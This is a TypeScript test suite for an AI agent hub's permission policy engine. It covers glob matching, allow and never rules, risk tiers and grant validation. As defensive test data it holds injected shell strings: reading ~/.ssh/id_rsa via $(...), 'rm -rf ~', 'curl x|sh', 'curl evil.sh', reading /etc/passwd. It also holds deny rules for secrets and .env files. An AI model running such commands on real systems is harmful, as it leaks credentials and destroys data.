// Pure grant policy (design §5, §7, §11.4; decision wvqeuis0): permission pattern grammar `action[:glob]`, OpenCode
// Wildcard semantics, bash→shell, every-resource matching, never beats allow (incl. save patterns), shell
// metacharacters, risk tiers, grant schema and duration validation, project path boundaries.
import { describe, expect, test } from "bun:test"
import { AgentError } from "../src/central/agent/errors"
import {
  GRANT_DEFAULT_EXPIRES_MS,
  GRANT_DEFAULT_MAX_ACTIONS_PER_HOUR,
  GRANT_VERBS,
  allowsResource,
  canonicalProject,
  evaluatePermission,
  forbidsResource,
  formatPattern,
  globCovers,
  globsOverlap,
  inProjects,
  parseDuration,
  parsePattern,
  riskTier,
  validateGrant,
  wildcard,
} from "../src/central/agent/policy"

describe("wildcard (OpenCode Wildcard.match)", () => {
  test.each([
    ["git status", "git status", true],
    ["git status --short", "git status*", true],
    ["git status", "git *", true],
    ["git", "git *", true], // a trailing " *" is optional
    ["gitk", "git *", false],
    ["src/a.ts", "src/*", true],
    ["src/deep/a.ts", "src/*", true], // * crosses slashes
    ["a.ts", "?.ts", true],
    ["ab.ts", "?.ts", false],
    ["axts", "a.ts", false], // . is literal
    ["a+b", "a+b", true],
    ["(x)", "(x)", true],
    ["src\\a.ts", "src/*", true], // backslashes normalise to /
    ["line1\nline2", "line1*", true], // * crosses newlines
    ["anything", "*", true],
    ["", "*", true],
    ["Git", "git", false], // case-sensitive
  ])("%j ~ %j → %p", (input, pattern, expected) => {
    expect(wildcard(input, pattern)).toBe(expected)
  })
})

describe("parsePattern", () => {
  test("action alone means every resource", () => {
    expect(parsePattern("external_directory")).toEqual({ action: "external_directory", resource: "*" })
    expect(parsePattern("read")).toEqual({ action: "read", resource: "*" })
  })

  test("action:glob splits at the first colon only", () => {
    expect(parsePattern("read:src/*")).toEqual({ action: "read", resource: "src/*" })
    expect(parsePattern("shell:echo a:b")).toEqual({ action: "shell", resource: "echo a:b" })
  })

  test("bash normalises to OpenCode's shell", () => {
    expect(parsePattern("bash:git status*")).toEqual({ action: "shell", resource: "git status*" })
    expect(parsePattern("bash")).toEqual({ action: "shell", resource: "*" })
  })

  test("MCP actions and action globs are kept", () => {
    expect(parsePattern("github_create_issue")).toEqual({ action: "github_create_issue", resource: "*" })
    expect(parsePattern("github_*")).toEqual({ action: "github_*", resource: "*" })
    expect(parsePattern("my-server.x_tool")).toEqual({ action: "my-server.x_tool", resource: "*" })
  })

  test.each(["", ":x", "read:", " read", "read ", "re ad", "read/x", "a".repeat(81), `read:${"x".repeat(1001)}`, 42, null])(
    "rejects %p",
    (bad) => {
      expect(parsePattern(bad as string)).toBeUndefined()
    },
  )
})

const p = (text: string) => parsePattern(text)!

describe("allowsResource", () => {
  test("the action and the resource must both match", () => {
    expect(allowsResource(p("read:src/*"), "read", "src/a.ts")).toBe(true)
    expect(allowsResource(p("read:src/*"), "edit", "src/a.ts")).toBe(false)
    expect(allowsResource(p("read:src/*"), "read", "test/a.ts")).toBe(false)
    expect(allowsResource(p("github_*"), "github_create_issue", "*")).toBe(true)
    expect(allowsResource(p("github_*"), "gitlab_create_issue", "*")).toBe(false)
  })

  test("a request's bash action is OpenCode's shell", () => {
    expect(allowsResource(p("bash:bun test*"), "shell", "bun test src")).toBe(true)
    expect(allowsResource(p("shell:bun test*"), "bash", "bun test src")).toBe(true)
  })

  test.each([
    ["echo $(cat ~/.ssh/id_rsa)", "echo *"],
    ["echo `id`", "echo *"],
    ["echo x > ~/.bashrc", "echo *"],
    ["sort < /etc/passwd", "sort *"],
    ["bun test $(rm -rf ~)", "bun test*"],
    ["bun test $(x)", "bun test $?x)"], // the ( of $( is never a wildcard's
    ["bun test $(x)", "bun test ?(x)"], // nor is its $
    ["ls >x", "*"],
  ])("shell %j never matches the glob %j", (resource, glob) => {
    expect(allowsResource(p(`shell:${glob}`), "shell", resource)).toBe(false)
  })

  test.each([
    ["echo $(date)", "echo $(date)"],
    ["echo $(date) > out.txt", "echo $(date) > *"],
    ["bun test > log.txt", "bun test > log.txt"],
    ["echo $HOME", "echo *"], // $ without ( is no substitution
    ["echo (a)", "echo *"],
  ])("shell %j matches %j (metacharacters written literally)", (resource, glob) => {
    expect(allowsResource(p(`shell:${glob}`), "shell", resource)).toBe(true)
  })

  test("other actions' resources may contain the characters", () => {
    expect(allowsResource(p("edit:src/*"), "edit", "src/a>b.ts")).toBe(true)
  })
})

describe("forbidsResource", () => {
  test("never patterns use plain wildcards: metacharacters do not escape them", () => {
    expect(forbidsResource(p("bash:rm -rf*"), "shell", "rm -rf $(pwd)")).toBe(true)
    expect(forbidsResource(p("bash:git push*"), "shell", "git push > /dev/null")).toBe(true)
    expect(forbidsResource(p("external_directory"), "external_directory", "/etc")).toBe(true)
    expect(forbidsResource(p("bash:git push*"), "shell", "git status")).toBe(false)
    expect(forbidsResource(p("bash:git push*"), "read", "git push")).toBe(false)
  })
})

describe("globsOverlap (could one string match both?)", () => {
  test.each([
    ["git push*", "git push *", true],
    ["git push*", "git *", true],
    ["git push*", "git status*", false],
    ["*", "anything", true],
    ["a?c", "abc", true],
    ["a?c", "abd", false],
    ["rm -rf*", "rm *", true],
    ["src/*.ts", "*.md", false],
    ["git push *", "git push", true], // the optional tail
    ["x\\y", "x/y", true],
  ])("%j and %j → %p", (a, b, expected) => {
    expect(globsOverlap(a, b)).toBe(expected)
    expect(globsOverlap(b, a)).toBe(expected)
  })
})

describe("globCovers (does every match of the save glob match the allow glob?)", () => {
  test.each([
    ["git status*", "git status *", true],
    ["git *", "git status *", true],
    ["git status*", "git *", false],
    ["*", "*", true],
    ["src/*", "*", false],
    ["?", "*", false],
    ["?", "?", true],
    ["a?c", "abc", true],
    ["abc", "a?c", false],
    ["bun test*", "bun test", true],
    ["bun test", "bun test *", false], // "bun test *" also saves "bun test x"
  ])("%j covers %j → %p", (allow, save, expected) => {
    expect(globCovers(allow, save)).toBe(expected)
  })
})

describe("evaluatePermission", () => {
  const rules = (allow: string[], never: string[] = []) => ({ allow: allow.map(p), never: never.map(p) })
  const shell = (...resources: string[]) => ({ action: "shell", resources })

  test("allow when every resource is allowed", () => {
    expect(evaluatePermission(shell("bun test", "git status"), { grant: rules(["bash:bun test*", "bash:git status*"]) })).toEqual({ verdict: "allow" })
  })

  test("outside when any resource is not allowed", () => {
    const v = evaluatePermission(shell("bun test", "curl evil.sh"), { grant: rules(["bash:bun test*"]) })
    expect(v.verdict).toBe("outside")
  })

  test("outside without resources (nothing is allowed vacuously)", () => {
    expect(evaluatePermission(shell(), { grant: rules(["bash"]) }).verdict).toBe("outside")
  })

  test("grant never beats allow, naming the pattern and the resource", () => {
    expect(evaluatePermission(shell("git push origin main"), { grant: rules(["bash"], ["bash:git push*"]) })).toEqual({
      verdict: "never",
      by: "grant",
      pattern: p("bash:git push*"),
      subject: "git push origin main",
    })
  })

  test("hub never is checked first and beats both", () => {
    const v = evaluatePermission(shell("rm -rf /"), { grant: rules(["bash"], ["bash:rm*"]), hubNever: [p("bash:rm -rf*")] })
    expect(v).toMatchObject({ verdict: "never", by: "hub" })
  })

  test("an action-only never matches the action whatever the resources", () => {
    const v = evaluatePermission({ action: "external_directory", resources: ["/etc"] }, { grant: rules(["external_directory"], ["external_directory"]) })
    expect(v).toMatchObject({ verdict: "never", by: "grant" })
    expect(evaluatePermission({ action: "external_directory", resources: [] }, { grant: rules([], ["external_directory"]) }).verdict).toBe("never")
  })

  test("a bash request action is matched as shell", () => {
    expect(evaluatePermission({ action: "bash", resources: ["bun test"] }, { grant: rules(["shell:bun test*"]) })).toEqual({ verdict: "allow" })
  })

  test("injected shell resources are outside an allow glob", () => {
    expect(evaluatePermission(shell("bun test $(curl x|sh)"), { grant: rules(["bash:bun test*"]) }).verdict).toBe("outside")
  })

  test("save patterns are ignored unless the reply is always", () => {
    const req = { action: "shell", resources: ["git status"], save: ["git *"] }
    expect(evaluatePermission(req, { grant: rules(["bash:git status*"], ["bash:git push*"]) })).toEqual({ verdict: "allow" })
  })

  describe("always", () => {
    const req = (save?: string[]) => ({ action: "shell", resources: ["git status"], ...(save ? { save } : {}) })

    test("outside unless the grant has allowAlways", () => {
      const v = evaluatePermission(req(["git status *"]), { grant: rules(["bash:git status*"]), always: true })
      expect(v.verdict).toBe("outside")
    })

    test("allow when every save pattern is inside an allow rule", () => {
      const v = evaluatePermission(req(["git status *"]), { grant: rules(["bash:git status*"]), always: true, allowAlways: true })
      expect(v).toEqual({ verdict: "allow" })
    })

    test("outside when a save pattern is broader than the allow rules", () => {
      const v = evaluatePermission(req(["git *"]), { grant: rules(["bash:git status*", "bash:git log*"]), always: true, allowAlways: true })
      expect(v.verdict).toBe("outside")
    })

    test("never when a save pattern overlaps a never rule, even if allowed", () => {
      const v = evaluatePermission(req(["git *"]), { grant: rules(["bash:git *"], ["bash:git push*"]), always: true, allowAlways: true })
      expect(v).toEqual({ verdict: "never", by: "grant", pattern: p("bash:git push*"), subject: "git *" })
      const hub = evaluatePermission(req(["git *"]), { grant: rules(["bash:git *"]), hubNever: [p("bash:git push*")], always: true, allowAlways: true })
      expect(hub).toMatchObject({ verdict: "never", by: "hub" })
    })

    test("outside without save patterns", () => {
      expect(evaluatePermission(req(), { grant: rules(["bash"]), always: true, allowAlways: true }).verdict).toBe("outside")
      expect(evaluatePermission(req([]), { grant: rules(["bash"]), always: true, allowAlways: true }).verdict).toBe("outside")
    })

    test("a shell save pattern with metacharacters must be allowed word for word", () => {
      const base = { action: "shell", resources: ["echo $(date)"] }
      expect(evaluatePermission({ ...base, save: ["echo $(date)"] }, { grant: rules(["bash:echo *"]), always: true, allowAlways: true }).verdict).toBe("outside")
      expect(evaluatePermission({ ...base, save: ["echo $(date)"] }, { grant: rules(["bash:echo $(date)"]), always: true, allowAlways: true })).toEqual({ verdict: "allow" })
    })

    test("read's save ['*'] needs an unrestricted read rule", () => {
      const read = { action: "read", resources: ["src/a.ts"], save: ["*"] }
      expect(evaluatePermission(read, { grant: rules(["read:src/*"]), always: true, allowAlways: true }).verdict).toBe("outside")
      expect(evaluatePermission(read, { grant: rules(["read"]), always: true, allowAlways: true })).toEqual({ verdict: "allow" })
    })
  })
})

describe("riskTier (set by the hub, never by the agent)", () => {
  const never = ["bash:git push*", "edit:.env*", "read:secrets/*"].map(p)

  test.each([
    ["shell", ["ls"]],
    ["bash", ["ls"]],
    ["external_directory", ["/etc"]],
    ["github_create_issue", ["*"]], // MCP tools are <server>_<tool>
    ["playwright_browser_navigate", ["*"]],
    ["doom_loop", ["*"]],
    ["something_new", ["*"]], // unknown actions are treated as MCP
  ])("%s is tap", (action, resources) => {
    expect(riskTier({ action, resources }, [])).toBe("tap")
  })

  test.each(["read", "edit", "write", "glob", "grep", "list", "lsp", "webfetch", "websearch", "codesearch", "task", "skill", "todowrite", "todoread", "question"])(
    "%s is confirm",
    (action) => {
      expect(riskTier({ action, resources: ["src/a.ts"] }, never)).toBe("confirm")
    },
  )

  test("near never is tap: a never rule matches a resource", () => {
    expect(riskTier({ action: "edit", resources: ["src/a.ts", ".env.local"] }, never)).toBe("tap")
    expect(riskTier({ action: "read", resources: ["secrets/key"] }, never)).toBe("tap")
  })

  test("near never is tap: a save pattern overlaps a never rule", () => {
    expect(riskTier({ action: "edit", resources: ["src/a.ts"], save: ["*"] }, never)).toBe("tap")
  })

  test("near never is tap: a resource contains a never rule's literal text", () => {
    expect(riskTier({ action: "read", resources: ["app/secrets/key"] }, never)).toBe("tap")
    expect(riskTier({ action: "edit", resources: ["config/.env"] }, never)).toBe("tap")
  })

  test("near never ignores never rules of other actions", () => {
    expect(riskTier({ action: "read", resources: [".env"] }, never)).toBe("confirm")
  })
})

describe("canonicalProject", () => {
  test.each([
    ["/Users/huy/projects/hub", "/Users/huy/projects/hub"],
    ["/Users/huy/projects/hub/", "/Users/huy/projects/hub"],
    ["/Users/huy//projects/./hub", "/Users/huy/projects/hub"],
    ["/Users/huy/projects/x/../hub", "/Users/huy/projects/hub"],
    ["C:\\Users\\huy\\hub\\", "C:/Users/huy/hub"],
  ])("%j → %j", (input, expected) => {
    expect(canonicalProject(input)).toBe(expected)
  })

  test.each(["", "relative/path", "~/projects", "/", "//", "/a/../..", "C:\\", "/a\0b", `/${"a".repeat(1100)}`, 7, null])("rejects %p", (bad) => {
    expect(canonicalProject(bad as string)).toBeUndefined()
  })
})

describe("inProjects (boundary match)", () => {
  const projects = ["/Users/huy/projects/hub"]

  test.each([
    ["/Users/huy/projects/hub", true],
    ["/Users/huy/projects/hub/", true],
    ["/Users/huy/projects/hub/.worktrees/p3", true],
    ["/Users/huy/projects/hub-evil", false], // a prefix is not a boundary
    ["/Users/huy/projects/hubx/src", false],
    ["/Users/huy/projects", false],
    ["/Users/huy/projects/hub/../other", false],
    ["relative", false],
  ])("%j → %p", (dir, expected) => {
    expect(inProjects(dir, projects)).toBe(expected)
  })

  test("any of several projects", () => {
    expect(inProjects("/srv/b/x", ["/srv/a", "/srv/b"])).toBe(true)
    expect(inProjects("/srv/c", ["/srv/a", "/srv/b"])).toBe(false)
    expect(inProjects("/srv/a", [])).toBe(false)
  })
})

describe("formatPattern", () => {
  test("action alone for every resource, else action:glob", () => {
    expect(formatPattern(p("bash"))).toBe("shell")
    expect(formatPattern(p("bash:git push*"))).toBe("shell:git push*")
    expect(formatPattern(p("read:*"))).toBe("read")
  })
})

describe("parseDuration", () => {
  test.each([
    [90, 90_000], // numbers are seconds, as elsewhere in the agent API
    ["45s", 45_000],
    ["30m", 1_800_000],
    ["8h", 28_800_000],
    ["2d", 172_800_000],
  ])("%p → %p ms", (input, ms) => {
    expect(parseDuration(input)).toBe(ms)
  })

  test.each(["", "8", "8 h", "1.5h", "-1h", "h", "8w", -5, Number.NaN, Number.POSITIVE_INFINITY, null, {}])("rejects %p", (bad) => {
    expect(parseDuration(bad)).toBeUndefined()
  })
})

describe("validateGrant", () => {
  const base = {
    holder: "@@orchestrator",
    scope: { projects: ["/Users/huy/projects/hub/"] },
    allow: ["approve", "deny", "answer", "prompt", "stop", "roles"],
    permissions: { allow: ["read", "edit", "bash:bun test*"], never: ["bash:git push*", "external_directory"] },
    expires: "8h",
    maxActionsPerHour: 120,
  }

  const invalid = (input: unknown, message: RegExp) => {
    let error: unknown
    try {
      validateGrant(input)
    } catch (e) {
      error = e
    }
    expect(error).toBeInstanceOf(AgentError)
    expect((error as AgentError).code).toBe("invalid")
    expect((error as AgentError).message).toMatch(message)
  }

  test("the design's example, canonicalised", () => {
    expect(validateGrant(base)).toEqual({
      holder: "@@orchestrator",
      scope: { projects: ["/Users/huy/projects/hub"] },
      allow: ["approve", "deny", "answer", "prompt", "stop", "roles"],
      permissions: { allow: ["read", "edit", "shell:bun test*"], never: ["shell:git push*", "external_directory"] },
      allowAlways: false,
      expiresInMs: 28_800_000,
      maxActionsPerHour: 120,
    })
  })

  test("defaults: no permissions, 8h, the hourly cap, no always", () => {
    const grant = validateGrant({ holder: "@@concierge", scope: { projects: ["/srv/app"] }, allow: ["prompt", "prompt"] })
    expect(grant).toEqual({
      holder: "@@concierge",
      scope: { projects: ["/srv/app"] },
      allow: ["prompt"],
      permissions: { allow: [], never: [] },
      allowAlways: false,
      expiresInMs: GRANT_DEFAULT_EXPIRES_MS,
      maxActionsPerHour: GRANT_DEFAULT_MAX_ACTIONS_PER_HOUR,
    })
  })

  test("allowAlways true is kept", () => {
    expect(validateGrant({ ...base, allowAlways: true }).allowAlways).toBe(true)
  })

  test.each(["@@orchestrator", "@@orchestrator-2", "@@concierge.hub", "@api-refactor", "ses_abc123", "app:0123456789abcdef"])("holder %s is accepted", (holder) => {
    expect(validateGrant({ ...base, holder }).holder).toBe(holder)
  })

  test("holders: reserved roles only, never @me, well formed", () => {
    invalid({ ...base, holder: "@@reviewer" }, /reserved role/)
    invalid({ ...base, holder: "@me" }, /holder/)
    invalid({ ...base, holder: "orchestrator" }, /holder/)
    invalid({ ...base, holder: "app:xyz" }, /holder/)
    invalid({ ...base, holder: undefined }, /holder/)
  })

  test("children is still deferred (phase 4)", () => {
    invalid({ ...base, scope: { ...base.scope, children: true } }, /children is not available yet \(phase 4\)/)
    invalid({ ...base, children: true }, /children is not available yet \(phase 4\)/)
  })

  test("launch is a grant verb (phase 4)", () => {
    expect(GRANT_VERBS).toContain("launch")
    expect(validateGrant({ ...base, allow: ["approve", "launch", "launch"] }).allow).toEqual(["approve", "launch"])
    invalid({ ...base, scope: { ...base.scope, launch: {} } }, /Unknown scope field launch/)
    invalid({ ...base, launch: true }, /Unknown grant field launch/)
  })

  test("scope needs canonical projects", () => {
    invalid({ ...base, scope: {} }, /project/)
    invalid({ ...base, scope: { projects: [] } }, /project/)
    invalid({ ...base, scope: { projects: ["relative"] } }, /project/)
    invalid({ ...base, scope: { projects: ["/"] } }, /project/)
    invalid({ ...base, scope: { projects: Array.from({ length: 21 }, (_, i) => `/p/${i}`) } }, /project/)
    invalid({ ...base, scope: "all" }, /scope/)
    invalid({ ...base, scope: { projects: ["/a"], sessions: ["@x"] } }, /sessions/)
  })

  test("verbs", () => {
    invalid({ ...base, allow: [] }, /verb/)
    invalid({ ...base, allow: ["approve", "delete"] }, /delete/)
    invalid({ ...base, allow: "approve" }, /verb/)
  })

  test("permission patterns", () => {
    invalid({ ...base, permissions: { allow: ["read:"] } }, /pattern/)
    invalid({ ...base, permissions: { never: [7] } }, /pattern/)
    invalid({ ...base, permissions: { allow: Array.from({ length: 101 }, (_, i) => `read:${i}`) } }, /pattern/)
    invalid({ ...base, permissions: { always: ["read"] } }, /always/)
    invalid({ ...base, permissions: [] }, /permissions/)
  })

  test("expires is 1 minute to 30 days", () => {
    expect(validateGrant({ ...base, expires: 60 }).expiresInMs).toBe(60_000)
    expect(validateGrant({ ...base, expires: "30d" }).expiresInMs).toBe(30 * 86_400_000)
    invalid({ ...base, expires: 59 }, /expires/)
    invalid({ ...base, expires: "31d" }, /expires/)
    invalid({ ...base, expires: "soon" }, /expires/)
  })

  test("maxActionsPerHour is a whole number 1–1000", () => {
    expect(validateGrant({ ...base, maxActionsPerHour: 1 }).maxActionsPerHour).toBe(1)
    expect(validateGrant({ ...base, maxActionsPerHour: 1000 }).maxActionsPerHour).toBe(1000)
    for (const bad of [0, 1001, 1.5, "10", -1]) invalid({ ...base, maxActionsPerHour: bad }, /maxActionsPerHour/)
  })

  test("allowAlways is a boolean; unknown fields are rejected", () => {
    invalid({ ...base, allowAlways: "yes" }, /allowAlways/)
    invalid({ ...base, admin: true }, /admin/)
    invalid(null, /object/)
    invalid([], /object/)
  })
})
